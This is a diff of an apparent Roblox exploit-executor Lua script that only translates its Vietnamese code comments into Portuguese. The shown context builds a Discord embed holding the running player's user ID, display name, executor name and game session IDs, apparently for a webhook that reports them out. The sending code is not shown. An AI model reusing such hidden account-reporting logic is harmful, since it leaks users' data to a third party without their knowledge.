@@ -10551,7 +10551,7 @@ end
 
 HighlightSelf(LocalPlayer)
 
--- Tắt/bật render khi focus cửa sổ
+-- Ligar/Desligar render ao focar janela
 InputService.WindowFocused:Connect(function()
     RunService:Set3dRenderingEnabled(true)
 end)
@@ -10569,13 +10569,13 @@ local executor = identifyexecutor()
 local placeId = game.PlaceId
 local jobId = game.JobId
 
--- Tạo dữ liệu gửi lên Discord
+--Criar dados para enviar ao Discord
 local Data = {
     ["embeds"] = {{
         ["title"] = "Roblox Account Information",
         ["url"] = "https://www.roblox.com/users/" .. player.UserId,
         ["description"] = "Display name: **" .. player.DisplayName .. "**",
-        ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
+        ["color"] = tonumber("0x000000"), --Mudar a cor da borda para preto
         ["thumbnail"] = {
             ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId ..
                 "&width=420&height=420&format=png"
